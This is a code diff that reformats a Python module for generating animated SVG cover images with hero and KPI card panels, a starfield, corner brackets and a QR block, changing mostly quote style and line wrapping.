         '<feComponentTransfer><feFuncA type="linear" slope="0.7"/></feComponentTransfer>'
         '<feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge></filter>'
-        '</defs>'
+        "</defs>"
     )
 
 
@@ -1326,7 +1361,7 @@ def _kpi_card(cx: int, cy: int, theme: str, value: str, label: str, sub: str) ->
         f'<text x="2" y="-28" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" letter-spacing="2" fill="{label_col}">{lab}</text>'
         f'<text x="2" y="18" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="{val_fs}" font-weight="900" fill="#F5F7FA">{val}</text>'
         f'<text x="2" y="40" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="600" fill="{soft}">{s}</text>'
-        f'</g>'
+        f"</g>"
     )
 
 
@@ -1346,7 +1381,7 @@ def _ambient_layer() -> str:
         '<circle cx="1060" cy="74" r="0.9"><animate attributeName="opacity" values="0.2;0.85;0.2" dur="5.1s" repeatCount="indefinite"/></circle>'
         '<circle cx="90" cy="580" r="1"><animate attributeName="opacity" values="0.15;0.8;0.15" dur="4.7s" repeatCount="indefinite"/></circle>'
         '<circle cx="550" cy="590" r="0.8"><animate attributeName="opacity" values="0.2;0.75;0.2" dur="3.6s" begin="0.5s" repeatCount="indefinite"/></circle>'
-        '</g>'
+        "</g>"
     )
 
 
@@ -1355,11 +1390,11 @@ def _corner_brackets(x: int, y: int, w: int, h: int, color: str, size: int = 10)
     s = size
     return (
         f'<g stroke="{color}" stroke-width="1.4" fill="none" opacity="0.7">'
-        f'<path d="M{x+4} {y+4+s} L{x+4} {y+4} L{x+4+s} {y+4}"/>'
-        f'<path d="M{x+w-4-s} {y+4} L{x+w-4} {y+4} L{x+w-4} {y+4+s}"/>'
-        f'<path d="M{x+4} {y+h-4-s} L{x+4} {y+h-4} L{x+4+s} {y+h-4}"/>'
-        f'<path d="M{x+w-4-s} {y+h-4} L{x+w-4} {y+h-4} L{x+w-4} {y+h-4-s}"/>'
-        f'</g>'
+        f'<path d="M{x + 4} {y + 4 + s} L{x + 4} {y + 4} L{x + 4 + s} {y + 4}"/>'
+        f'<path d="M{x + w - 4 - s} {y + 4} L{x + w - 4} {y + 4} L{x + w - 4} {y + 4 + s}"/>'
+        f'<path d="M{x + 4} {y + h - 4 - s} L{x + 4} {y + h - 4} L{x + 4 + s} {y + h - 4}"/>'
+        f'<path d="M{x + w - 4 - s} {y + h - 4} L{x + w - 4} {y + h - 4} L{x + w - 4} {y + h - 4 - s}"/>'
+        f"</g>"
     )
 
 
@@ -1370,11 +1405,11 @@ def _hero_radar_arc(cx: int, cy: int, color: str) -> str:
         f'<circle r="180" fill="none" stroke="{color}" stroke-width="0.6" stroke-dasharray="2 4"/>'
         f'<circle r="140" fill="none" stroke="{color}" stroke-width="0.6" stroke-dasharray="2 4" opacity="0.7"/>'
         f'<circle r="100" fill="none" stroke="{color}" stroke-width="0.6" stroke-dasharray="2 4" opacity="0.5"/>'
-        f'<g>'
+        f"<g>"
         f'<path d="M0 0 L180 0 A180 180 0 0 1 127 127 Z" fill="{color}" opacity="0.10"/>'
         f'<animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="14s" repeatCount="indefinite"/>'
-        f'</g>'
-        f'</g>'
+        f"</g>"
+        f"</g>"
     )
 
 
@@ -1385,17 +1420,17 @@ def _data_strip(x: int, y: int, w: int, color: str) -> str:
     for i in range(0, w, step):
         height = 4 if (i // step) % 3 == 0 else 2
         ticks.append(
-            f'<rect x="{x+i}" y="{y}" width="1" height="{height}" fill="{color}" opacity="0.55"/>'
+            f'<rect x="{x + i}" y="{y}" width="1" height="{height}" fill="{color}" opacity="0.55"/>'
         )
     return (
-        f'<g>'
-        f'<rect x="{x}" y="{y-2}" width="{w}" height="1" fill="{color}" opacity="0.35"/>'
-        f'{"".join(ticks)}'
-        f'<rect x="{x+w-50}" y="{y-1}" width="50" height="6" fill="{color}" opacity="0.45">'
-        f'<animate attributeName="x" values="{x};{x+w-50};{x}" dur="6.4s" repeatCount="indefinite"/>'
+        f"<g>"
+        f'<rect x="{x}" y="{y - 2}" width="{w}" height="1" fill="{color}" opacity="0.35"/>'
+        f"{''.join(ticks)}"
+        f'<rect x="{x + w - 50}" y="{y - 1}" width="50" height="6" fill="{color}" opacity="0.45">'
+        f'<animate attributeName="x" values="{x};{x + w - 50};{x}" dur="6.4s" repeatCount="indefinite"/>'
         f'<animate attributeName="opacity" values="0.2;0.7;0.2" dur="6.4s" repeatCount="indefinite"/>'
-        f'</rect>'
-        f'</g>'
+        f"</rect>"
+        f"</g>"
     )
 
 
@@ -1414,7 +1449,7 @@ def _extra_starfield() -> str:
         '<circle cx="704" cy="600" r="0.8"><animate attributeName="opacity" values="0.18;0.7;0.18" dur="4.2s" begin="0.4s" repeatCount="indefinite"/></circle>'
         '<circle cx="892" cy="608" r="1.1"><animate attributeName="opacity" values="0.22;0.9;0.22" dur="4.7s" begin="0.6s" repeatCount="indefinite"/></circle>'
         '<circle cx="1078" cy="600" r="0.9"><animate attributeName="opacity" values="0.2;0.85;0.2" dur="3.6s" begin="0.8s" repeatCount="indefinite"/></circle>'
-        '</g>'
+        "</g>"
     )
 
 
@@ -1425,22 +1460,22 @@ def _spark_accents() -> str:
         '<g fill="#F87171">'
         '<circle cx="1104" cy="110" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.8s" repeatCount="indefinite"/></circle>'
         '<circle cx="1124" cy="110" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.4s" begin="0.3s" repeatCount="indefinite"/></circle>'
-        '</g>'
+        "</g>"
         '<g fill="#7DA3D9">'
         '<circle cx="1104" cy="218" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="2s" repeatCount="indefinite"/></circle>'
         '<circle cx="1124" cy="218" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.6s" begin="0.4s" repeatCount="indefinite"/></circle>'
-        '</g>'
+        "</g>"
         '<g fill="#FFD58A">'
         '<circle cx="1104" cy="374" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.8s" repeatCount="indefinite"/></circle>'
         '<circle cx="1124" cy="374" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.6s" begin="0.3s" repeatCount="indefinite"/></circle>'
-        '</g>'
+        "</g>"
         '<g stroke="#E63946" stroke-width="0.5" fill="none">'
         '<path d="M20 230 L28 230"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2s" repeatCount="indefinite"/></path>'
         '<path d="M20 300 L28 300"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2.3s" begin="0.3s" repeatCount="indefinite"/></path>'
         '<path d="M20 370 L28 370"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="1.9s" begin="0.6s" repeatCount="indefinite"/></path>'
         '<path d="M20 440 L28 440"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2.1s" begin="0.9s" repeatCount="indefinite"/></path>'
-        '</g>'
-        '</g>'
+        "</g>"
+        "</g>"
     )
 
 
@@ -1507,8 +1542,8 @@ def render_l20_hero(
         f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 630" '
         f'width="1200" height="630" role="img" aria-label="{aria}">'
     )
-    parts.append('<!-- profile: high-quality-cover (L20 Hero+2-Card) -->')
-    parts.append(f'<title>{title}</title>')
+    parts.append("<!-- profile: high-quality-cover (L20 Hero+2-Card) -->")
+    parts.append(f"<title>{title}</title>")
     parts.append(_defs())
     # Background
     parts.append('<rect width="1200" height="630" fill="url(#bgSpread)"/>')
@@ -1516,7 +1551,9 @@ def render_l20_hero(
     parts.append(_ambient_layer())
     parts.append(_extra_starfield())
     # Header bar
-    parts.append('<rect x="0" y="0" width="1200" height="56" fill="#050813" opacity="0.92"/>')
+    parts.append(
+        '<rect x="0" y="0" width="1200" height="56" fill="#050813" opacity="0.92"/>'
+    )
     parts.append(
         '<text x="36" y="36" font-family="Inter, Helvetica, Arial, sans-serif" '
         f'font-size="18" font-weight="700" fill="#8FB8FF" letter-spacing="2.5">{_escape(eyebrow)}</text>'
@@ -1547,7 +1584,7 @@ def render_l20_hero(
     parts.append(
         f'<text x="54" y="112" font-family="Inter, Helvetica, Arial, sans-serif" '
         f'font-size="13" font-weight="700" fill="{hero_t["accent_soft"]}" letter-spacing="3">'
-        f'{_escape(hero["tag"])}  /  {_escape(hero["index"])}</text>'
+        f"{_escape(hero['tag'])}  /  {_escape(hero['index'])}</text>"
     )
     parts.append(
         f'<text x="54" y="146" font-family="Inter, Helvetica, Arial, sans-serif" '
@@ -1557,25 +1594,40 @@ def render_l20_hero(
         f'<text x="54" y="174" font-family="Inter, Helvetica, Arial, sans-serif" '
         f'font-size="17" font-weight="500" fill="{hero_text}">{_escape(_fit_subheadline(hero["subheadline"], max_chars=62))}</text>'
     )
-    parts.append('</g>')
+    parts.append("</g>")
     # Hero panel decorations (radar arc behind visual, corner brackets, data strip)
     parts.append(_hero_radar_arc(332, 360, hero_accent))
     parts.append(_corner_brackets(32, 80, 600, 510, hero_accent, size=12))
     parts.append(_data_strip(54, 528, 280, hero_accent))
     # Hero embedded visual (centered around (332, 360))
-    parts.append(_render_visual(hero["visual"], 332, 360, hero["theme"], hero.get("kpi_label", ""), topic=hero.get("headline", ""), band_index=0, severity=hero.get("severity", ""), cover_seed=cover_seed, scale=_HERO_NEUTRAL_SCALE))
+    parts.append(
+        _render_visual(
+            hero["visual"],
+            332,
+            360,
+            hero["theme"],
+            hero.get("kpi_label", ""),
+            topic=hero.get("headline", ""),
+            band_index=0,
+            severity=hero.get("severity", ""),
+            cover_seed=cover_seed,
+            scale=_HERO_NEUTRAL_SCALE,
+        )
+    )
     # Hero action tag
     parts.append('<g transform="translate(54,548)">')
     # Full-opacity fill so the rendered button bg == the theme accent, and the
     # label color is contrast-picked against it (WCAG AA) — white labels failed
     # AA on the light accents (amber/green/purple).
-    parts.append(f'<rect x="0" y="0" width="280" height="24" rx="3" fill="{hero_accent}"/>')
+    parts.append(
+        f'<rect x="0" y="0" width="280" height="24" rx="3" fill="{hero_accent}"/>'
+    )
     parts.append(
         f'<text x="140" y="17" text-anchor="middle" '
         f'font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" '
         f'fill="{button_text_color(hero_accent)}">{_escape(hero["action"])}</text>'
     )
-    parts.append('</g>')
+    parts.append("</g>")
     parts.append(
         f'<text x="350" y="566" font-family="Inter, Helvetica, Arial, sans-serif" '
         f'font-size="13" font-weight="600" fill="#A5B4C4" font-style="italic">{_escape(footer_label)}  /  {_escape(date_str)}</text>'
@@ -1594,7 +1646,7 @@ def render_l20_hero(
     parts.append(
         f'<text x="670" y="110" font-family="Inter, Helvetica, Arial, sans-serif" '
         f'font-size="12" font-weight="700" fill="{tr_t["label_color"]}" letter-spacing="3">'
-        f'{_escape(top_right["tag"])}  /  {_escape(top_right["index"])}</text>'
+        f"{_escape(top_right['tag'])}  /  {_escape(top_right['index'])}</text>"
     )
     parts.append(
         f'<text x="670" y="140" font-family="Inter, Helvetica, Arial, sans-serif" '
@@ -1604,10 +1656,31 @@ def render_l20_hero(
         f'<text x="670" y="163" font-family="Inter, Helvetica, Arial, sans-serif" '
         f'font-size="14" font-weight="500" fill="{tr_t["accent_text"]}">{_escape(_fit_subheadline(top_right["subheadline"]))}</text>'
     )
-    parts.append('</g>')
+    parts.append("</g>")
     parts.append(_corner_brackets(652, 80, 516, 248, tr_accent, size=9))
-    parts.append(_render_visual(top_right["visual"], 800, 230, top_right["theme"], top_right.get("kpi_label", ""), topic=top_right.get("headline", ""), band_index=1, severity=top_right.get("severity", ""), cover_seed=cover_seed))
-    parts.append(_kpi_card(1094, 168, top_right["theme"], top_right["kpi_value"], top_right["kpi_label"], top_right["kpi_sub"]))
+    parts.append(
+        _render_visual(
+            top_right["visual"],
+            800,
+            230,
+            top_right["theme"],
+            top_right.get("kpi_label", ""),
+            topic=top_right.get("headline", ""),
+            band_index=1,
+            severity=top_right.get("severity", ""),
+            cover_seed=cover_seed,
+        )
+    )
+    parts.append(
+        _kpi_card(
+            1094,
+            168,
+            top_right["theme"],
+            top_right["kpi_value"],
+            top_right["kpi_label"],
+            top_right["kpi_sub"],
+        )
+    )
 
     # BOTTOM RIGHT panel
     parts.append(
@@ -1622,7 +1695,7 @@ def render_l20_hero(
     parts.append(
         f'<text x="670" y="374" font-family="Inter, Helvetica, Arial, sans-serif" '
         f'font-size="12" font-weight="700" fill="{br_t["label_color"]}" letter-spacing="3">'
-        f'{_escape(bottom_right["tag"])}  /  {_escape(bottom_right["index"])}</text>'
+        f"{_escape(bottom_right['tag'])}  /  {_escape(bottom_right['index'])}</text>"
     )
     parts.append(
         f'<text x="670" y="404" font-family="Inter, Helvetica, Arial, sans-serif" '
@@ -1632,20 +1705,40 @@ def render_l20_hero(
         f'<text x="670" y="428" font-family="Inter, Helvetica, Arial, sans-serif" '
         f'font-size="14" font-weight="500" fill="{br_t["accent_text"]}">{_escape(_fit_subheadline(bottom_right["subheadline"]))}</text>'
     )
-    parts.append('</g>')
+    parts.append("</g>")
     parts.append(_corner_brackets(652, 344, 516, 246, br_accent, size=9))
-    parts.append(_render_visual(bottom_right["visual"], 800, 490, bottom_right["theme"], bottom_right.get("kpi_label", ""), topic=bottom_right.get("headline", ""), band_index=2, severity=bottom_right.get("severity", ""), cover_seed=cover_seed))
+    parts.append(
+        _render_visual(
+            bottom_right["visual"],
+            800,
+            490,
+            bottom_right["theme"],
+            bottom_right.get("kpi_label", ""),
+            topic=bottom_right.get("headline", ""),
+            band_index=2,
+            severity=bottom_right.get("severity", ""),
+            cover_seed=cover_seed,
+        )
+    )
     # BR KPI card sits in the upper-right of the panel (cy=414 -> y 359..469) so
     # its lower edge clears the frame-anchored QR block: qr_block draws the
     # "scan / full post" label at y=486 (top ~479) and a 132x132 white rect at
     # y 492..624. At the previous cy=452 (y 397..507) the card's bottom-right
     # corner was occluded by that white rect and the scan label. Keep cx=1094 in
     # lockstep with the top-right KPI so the two cards stay vertically aligned.
-    parts.append(_kpi_card(1094, 414, bottom_right["theme"], bottom_right["kpi_value"], bottom_right["kpi_label"], bottom_right["kpi_sub"]))
+    parts.append(
+        _kpi_card(
+            1094,
+            414,
+            bottom_right["theme"],
+            bottom_right["kpi_value"],
+            bottom_right["kpi_label"],
+            bottom_right["kpi_sub"],
+        )
+    )
 
     parts.append(_spark_accents())
     # QR (real)
     parts.append(l22.qr_block(url))
-    parts.append('</svg>')
+    parts.append("</svg>")
     return "\n".join(parts) + "\n"
-
